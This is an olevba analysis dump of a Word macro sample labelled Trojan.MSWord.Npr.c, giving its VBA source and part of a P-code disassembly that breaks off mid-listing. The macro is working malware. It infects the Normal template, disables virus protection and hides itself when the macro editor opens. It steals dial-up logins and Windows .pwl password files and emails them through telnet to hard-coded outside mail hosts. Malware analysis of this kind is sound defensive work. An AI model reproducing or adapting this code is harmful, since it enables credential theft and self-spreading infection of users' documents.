olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Npr.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Npr.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPlus.bas 
in file: ./Trojan.MSWord.Npr.c - OLE stream: 'Macros/VBA/MSPlus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub AutoOpen()
Dim Yes As Boolean
Dim Source As String
Dim VBComponent As Object
On Error Resume Next
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
Source = MacroContainer.FullName
Yes = False
For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPlus" Then
  Yes = True
 End If
Next
 If Yes = False Then
 CopyModule NormalTemplate.FullName, Source
 End If
  Options.VirusProtection = False
 Options.SaveNormalPrompt = False
 NormalTemplate.Save
End Sub
Sub CopyModule(Target As String, Source_ As String)
Dim VBComponent As Object
On Error Resume Next
Application.OrganizerCopy _
  Source:=Source_, _
  Destination:=Target, _
  Name:="MSPlus", _
  Object:=wdOrganizerObjectProjectItems
For Each VBComponent In MacroContainer.VBProject.VBComponents
  If VBComponent.Name <> "ThisDocument" Then
   Application.OrganizerCopy _
    Source:=Source_, _
    Destination:=Target, _
    Name:=VBComponent.Name, _
    Object:=wdOrganizerObjectProjectItems
 End If
Next

End Sub
Sub AutoExit()
Application.Visible = False
Tmsn
End Sub
Sub FileOpen()
AutoOpen
Dialogs(80).Show
Tmsn
End Sub
Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Tmsn
End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Sub AutoClose()
AutoOpen
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Sender()
Dim Handle As Long
Dim HandleBW As Long
Dim hWnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 5) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim TWnd As String
Dim None As String
On Error Resume Next
If Chkip > 400 Then
Host(1) = "chat.ru"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "194.67.1.159"
Loto 5, A()
For f = 1 To 5
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    TWnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Телнет - (нет)")
   TWnd = "Телнет - "
    None = "(нет)"
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 60 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), TWnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
SMTP = "helo oracle#$mail from: <graber@lwp.com>#rcpt to: <kashek@usa.net>#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hWnd <> 0 Or Timer - Start > 150
 hWnd = FindWindow(CLng(0), TWnd)
 DoEvents
Loop
Select Case hWnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hWnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), TWnd + " - " + None)
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Handle = 0
End Select
Next
End If
End Sub
Function Chkip()
Dim hWnd As Long
Dim Start As Long
Dim A As Long
Dim i As Long
Dim NF As Integer
Dim NF1 As Integer
On Error Resume Next
NF = FreeFile
Open "c:\windows\chkip.bat" For Output Access Write As #NF
Print #NF, "route print > c:\windows\chkip.bmp"
Close #NF
Shell "c:\windows\chkip.bat", 0
Start = Timer
 Do While FindWindow(CLng(0), "(Сеанс завершен) - chkip") = 0
        DoEvents
        If Timer > Start + 10 Then
         Exit Function
        End If
 Loop
hWnd = FindWindow(CLng(0), "(Сеанс завершен) - chkip")
SendMessage hWnd, CLng(16), ByVal CLng(0), 0
Chkip = FileLen("c:\windows\chkip.bmp")
A = 255
NF = FreeFile
Open "c:\windows\chkip.bat" For Binary Access Write As #NF
NF1 = FreeFile
Open "c:\windows\chkip.bmp" For Binary Access Write As #NF1
For i = 1 To LOF(NF)
 Put #NF, i, A
Next
For i = 1 To LOF(NF1)
 Put #NF1, i, A
Next
Close #NF
Close #NF1
Kill "c:\windows\chkip.bat"
Kill "c:\windows\chkip.bmp"
End Function
Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next

End Function
Sub Filler(MessStr As String, hWnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hWnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
   Charset = SendMessage(hWnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub
Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub
Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
Close #NF
Print #NF1, PwdLst
Close #NF1
End Function
Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function
Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function
Sub ViewVBCode()
Deleter
ShowVisualBasicEditor = True
End Sub
Sub ToolsMacro()
Deleter
Dialogs(wdDialogToolsMacro).Display
End Sub
Sub Deleter()
Dim TempPath As String, TempName As String
Dim Docum As Object
Dim VBComp As Object
On Error Resume Next
For Each VBComp In NormalTemplate.VBProject.VBComponents
 If VBComp.Name <> "ThisDocument" Then
  With NormalTemplate.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
  End With
 Application.OrganizerDelete NormalTemplate.Name, VBComp.Name, wdOrganizerObjectProjectItems
 End If
Next
For Each VBComp In ActiveDocument.VBProject.VBComponents
 Debug.Print VBComp.Name
  If VBComp.Name <> "ThisDocument" Then
   With ActiveDocument.VBProject.VBComponents(VBComp.Name).CodeModule
    .DeleteLines 1, .CountOfLines
   End With
   Application.OrganizerDelete ActiveDocument.Name, VBComp.Name, wdOrganizerObjectProjectItems
   End If
Next
Options.SaveNormalPrompt = True
End Sub
Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub







-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Npr.c
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1128 bytes
' Macros/VBA/MSPlus - 26147 bytes
' Line #0:
' 	Option  (Explicit)
' Line #1:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hWnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #2:
' 	LineCont 0x0008 06 00 00 00 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #5:
' 	Dim 
' 	VarDefn Source (As String)
' Line #6:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErrors 
' Line #10:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	St Source 
' Line #11:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #12:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #13:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0006 "MSPlus"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	StartForVariable 
' 	Next 
' Line #17:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #18:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Ld Source 
' 	ArgsCall CopyModule 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #22:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #23:
' 	EndSub 
' Line #24:
' 	FuncDefn (Sub CopyModule(Target As String, Source_ As String))
' Line #25:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #26:
' 	OnError (Resume Next) 
' Line #27:
' 	LineCont 0x0010 03 00 02 00 07 00 02 00 0B 00 02 00 0F 00 02 00
' 	Ld Source_ 
' 	ParamNamed Source 
' 	Ld Target 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "MSPlus"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #28:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #29:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #30:
' 	LineCont 0x0010 03 00 04 00 07 00 04 00 0B 00 04 00 11 00 04 00
' 	Ld Source_ 
' 	ParamNamed Source 
' 	Ld Target 
' 	ParamNamed Destination 
' 	Ld VBComponent 
' 	MemLd New 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	StartForVariable 
' 	Next 
' Line #33:
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub AutoExit())
' Line #36:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #37:
' 	ArgsCall Tmsn 0x0000 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Sub FileOpen())
' Line #40:
' 	ArgsCall AutoOpen 0x0000 
' Line #41:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #42:
' 	ArgsCall Tmsn 0x0000 
' Line #43:
' 	EndSub 
' Line #44:
' 	FuncDefn (Sub FileSave())
' Line #45:
' 	OnError (Resume Next) 
' Line #46:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #47:
' 	ArgsCall Tmsn 0x0000 
' Line #48:
' 	EndSub 
' Line #49:
' 	FuncDefn (Sub FileClose())
' Line #50:
' 	OnError (Resume Next) 
' Line #51:
' 	ArgsCall AutoOpen 0x0000 
' Line #52:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub AutoClose())
' Line #55:
' 	ArgsCall AutoOpen 0x0000 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub Tmsn())
' Line #58:
' 	Dim 
' 	VarDefn Delta (As Integer)
' Line #59:
' 	Dim 
' 	VarDefn Old (As Byte)
' Line #60:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #61:
' 	Ld Friend 
' 	St NF 
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	LitStr 0x0014 "c:\windows\logow.sys"
' 	Ld NF 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read)
' Line #64:
' 	Ld NF 
' 	Sharp 
' 	LitDI4 0x2CBD 0x0001 
' 	Ld Old 
' 	GetRec 
' Line #65:
' 	Ld NF 
' 	Sharp 
' 	Close 0x0001 
' Line #66:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	St Delta 
' Line #67:
' 	Ld Delta 
' 	Ld Old 
' 	Sub 
' 	St Delta 
' Line #68:
' 	Ld Delta 
' 	SelectCase 
' Line #69:
' 	LitDI2 0x0002 
' 	CaseGt 
' 	CaseDone 
' Line #70:
' 	ArgsCall Sender 0x0000 
' Line #71:
' 	LitDI2 0x0000 
' 	Ld Delta 
' 	LitDI2 0x001F 
' 	Add 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	CaseLt 
' 	CaseDone 
' Line #72:
' 	ArgsCall Sender 0x0000 
' Line #73:
' 	CaseElse 
' Line #74:
' 	EndSelect 
' Line #75:
' 	EndSub 
' Line #76:
' 	FuncDefn (Sub Sender())
' Line #77:
' 	Dim 
' 	VarDefn Handle (As Long)
' Line #78:
' 	Dim 
' 	VarDefn HandleBW (As Long)
' Line #79:
' 	Dim 
' 	VarDefn hWnd (As Long)
' Line #80:
' 	Dim 
' 	VarDefn FileName (As String)
' Line #81:
' 	Dim 
' 	VarDefn Start (As Long)
' Line #82:
' 	Dim 
' 	VarDefn MyDat (As Byte)
' Line #83:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #84:
' 	Dim 
' 	VarDefn NPwl (As String)
' Line #85:
' 	Dim 
' 	VarDefn j (As Integer)
' Line #86:
' 	Dim 
' 	VarDefn Title (As String)
' Line #87:
' 	Dim 
' 	VarDefn SMTP (As String)
' Line #88:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	VarDefn Host (As String)
' Line #89:
' 	Dim 
' 	VarDefn A (As Integer)
' Line #90:
' 	Dim 
' 	VarDefn False (As Integer)
' Line #91:
' 	Dim 
' 	VarDefn NF (As Integer)
' Line #92:
' 	Dim 
' 	VarDefn THwnd (As Long)
' Line #93:
' 	Dim 
' 	VarDefn TWnd (As String)
' Line #94:
' 	Dim 
' 	VarDefn None (As String)
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	Ld Chkip 
' 	LitDI2 0x0190 
' 	Gt 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0007 "chat.ru"
' 	LitDI2 0x0001 
' 	ArgsSt Host 0x0001 
' Line #98:
' 	LitStr 0x000E "mail.iname.com"
' 	LitDI2 0x0002 
' 	ArgsSt Host 0x0001 
' Line #99:
' 	LitStr 0x000E "194.186.182.26"
' 	LitDI2 0x0003 
' 	ArgsSt Host 0x0001 
' Line #100:
' 	LitStr 0x000C "195.75.32.20"
' 	LitDI2 0x0004 
' 	ArgsSt Host 0x0001 
' Line #101:
' 	LitStr 0x000C "194.67.1.159"
' 	LitDI2 0x0005 
' 	ArgsSt Host 0x0001 
' Line #102:
' 	LitDI2 0x0005 
' 	ArgsLd A 0x0000 
' 	ArgsCall Loto 0x0002 
' Line #103:
' 	StartForVariable 
' 	Ld False 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #104:
' 	LitStr 0x0006 "telnet"
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #105:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000F "Telnet - (none)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #106:
' 	Ld THwnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #107:
' 	LitStr 0x0006 "telnet"
' 	St TWnd 
' Line #108:
' 	LitStr 0x0006 "(none)"
' 	St None 
' Line #109:
' 	ElseBlock 
' Line #110:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Телнет - (нет)"
' 	ArgsLd FindWindow 0x0002 
' 	St THwnd 
' Line #111:
' 	LitStr 0x0009 "Телнет - "
' 	St TWnd 
' Line #112:
' 	LitStr 0x0005 "(нет)"
' 	St None 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Ld THwnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #115:
' 	LitStr 0x0007 "telnet "
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	LitStr 0x0003 " 25"
' 	Add 
' 	LitDI2 0x0000 
' 	ArgsCall Shell 0x0002 
' Line #116:
' 	ArgsCall DoEvents 0x0000 
' Line #117:
' 	Ld Timer 
' 	St Start 
' Line #118:
' 	Ld Handle 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x003C 
' 	Gt 
' 	Or 
' 	Ld HandleBW 
' 	LitDI2 0x0000 
' 	Ne 
' 	Or 
' 	DoUnitil 
' Line #119:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	LitStr 0x0003 " - "
' 	Add 
' 	Ld False 
' 	ArgsLd A 0x0001 
' 	ArgsLd Host 0x0001 
' 	Add 
' 	ArgsLd FindWindow 0x0002 
' 	St Handle 
' Line #120:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	LitStr 0x000E "Connect failed"
' 	ArgsLd FindWindow 0x0002 
' 	St HandleBW 
' Line #121:
' 	ArgsCall DoEvents 0x0000 
' Line #122:
' 	Loop 
' Line #123:
' 	Ld Handle 
' 	SelectCase 
' Line #124:
' 	LitDI2 0x0000 
' 	CaseNe 
' 	CaseDone 
' Line #125:
' 	LineCont 0x0008 04 00 01 00 0B 00 01 00
' 	LitStr 0x0050 "helo oracle#$mail from: <graber@lwp.com>#rcpt to: <kashek@usa.net>#$data#$Date: "
' 	Ld Date$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld Time$ 
' 	Add 
' 	LitStr 0x0080 "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "----=_NextPart"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0084 "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
' 	Add 
' 	St SMTP 
' Line #126:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #127:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #128:
' 	Ld FileName 
' 	ArgsCall Grab 0x0001 
' Line #129:
' 	Ld FileName 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #130:
' 	LitStr 0x000B "c:\windows\"
' 	Ld FileName 
' 	Add 
' 	ArgsCall Kill 0x0001 
' Line #131:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #132:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #133:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #134:
' 	Ld i 
' 	ArgsLd NPwl 0x0000 
' 	ArgsCall FindPWL 0x0002 
' Line #135:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #136:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #137:
' 	LitStr 0x000B "c:\windows\"
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	ArgsLd FileLen 0x0001 
' 	LitDI2 0x02B0 
' 	Ne 
' 	IfBlock 
' Line #138:
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	ArgsLd Base64 0x0001 
' 	St SMTP 
' Line #139:
' 	Ld SMTP 
' 	ArgsLd Adapt 0x0001 
' 	St SMTP 
' Line #140:
' 	LineCont 0x000C 08 00 03 00 15 00 03 00 1B 00 03 00
' 	LitStr 0x003F "#------=_NextPart#Content-Type: application/octet-stream; name="
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0038 "#Content-Transfer-Encoding: base64#Content-Description: "
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitStr 0x003E "(PWL PassWord List)#Content-Disposition: attachment; filename="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld j 
' 	ArgsLd NPwl 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0001 "#"
' 	Add 
' 	St Title 
' Line #141:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #142:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #143:
' 	Ld SMTP 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #144:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	StartForVariable 
' 	Next 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	LitStr 0x001C "##------=_NextPart--#.#quit#"
' 	St Title 
' Line #149:
' 	Ld Title 
' 	Ld Handle 
' 	ArgsCall Filler 0x0002 
' Line #150:
' 	LitDI2 0x0001 
' 	ArgsCall Pause 0x0001 
' Line #151:
' 	Ld Timer 
' 	St Start 
' Line #152:
' 	Ld hWnd 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld Timer 
' 	Ld Start 
' 	Sub 
' 	LitDI2 0x0096 
' 	Gt 
' 	Or 
' 	DoUnitil 
' Line #153:
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	Ld TWnd 
' 	ArgsLd FindWindow 0x0002 
' 	St hWnd 
' Line #154:
' 	ArgsCall DoEvents 0x0000 
' Line #155:
' 	Loop 
' Line #156:
' 	Ld hWnd 
' 	SelectCase 
' Line #157:
' 	LitDI2 0x0000 
' 	CaseEq 
' 	CaseDone 
' Line #158:
' 	Ld Handle 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #159:
' 	LitDI2 0x0000 
' 	St Handle 
' Line #160:
' 	CaseElse 
' Line #161:
' 	Ld hWnd 
' 	LitDI2 0x0010 
' 	Coerce (Lng) 
' 	LitDI2 0x0000 
' 	Coerce (Lng) 
' 	ParamByVal 
' 	LitDI2 0x0000 
' 	ArgsCall SendMessage 0x0004 
' Line #162:
' 	Ld Friend 
' 	St NF 
' Line #163:
' 	Ld Date$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
